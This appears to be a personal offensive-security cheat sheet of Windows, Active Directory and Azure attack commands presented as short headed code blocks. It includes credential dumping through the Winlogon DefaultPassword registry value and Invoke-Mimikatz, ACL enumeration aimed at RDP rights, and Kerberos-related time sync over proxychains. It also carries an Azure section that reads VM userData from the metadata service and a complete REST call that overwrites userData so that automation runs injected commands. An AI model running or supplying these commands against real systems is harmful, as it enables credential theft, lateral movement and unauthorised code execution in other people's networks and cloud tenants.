**Random**
```
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
script -qc /bin/bash /dev/null
```
**Hide Error in PowerShell**
```
$ErrorActionPreference= 'silentlycontinue'
```
**Filtering Powershell objects**
```
Get-UserProperty -Properties logoncount | Where logoncount -ne 0
```
**Filtering Powershell objects**
```
Get-ObjectAcl -SamAccountName Control174User –ResolveGUIDs | Where-Object {$_.IdentityReference -like "RDP*"} 
```
**Creds**
```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword"
Invoke-Mimikatz -DumpCreds/-DumpCerts 
```
**Service Ticket Combos - https://adsecurity.org/?p=2011**
**DC Time Sync**
```
proxychains net time set -S 172.16.3.5
```
**Expand Property**
```
(get-azvm | select -ExpandProperty networkprofile).NetworkInterfaces.id 
```
**AZURE**
- **Check UserData**
```
$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text";[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
```
- **Modify UserData**
```
## It is also possible to modify user data with permissions "Microsoft.Compute/virtualMachines/write" on the target VM. Any automation or scheduled task reading commands from user data can be abused!

$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("whoami"))
$accessToken = (Get-AzAccessToken).Token
$Url = "https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm?api-version=2021-07-01"
$body = @(
@{
location = "Germany West Central"
properties = @{
userData = "$data"
}
}
) | ConvertTo-Json -Depth 4

$headers = @{
Authorization = "Bearer $accessToken"
}

## Execute Rest API Call

$Results = Invoke-RestMethod -Method Put -Uri $Url -Body $body -Headers $headers -ContentType 'application/json'
```
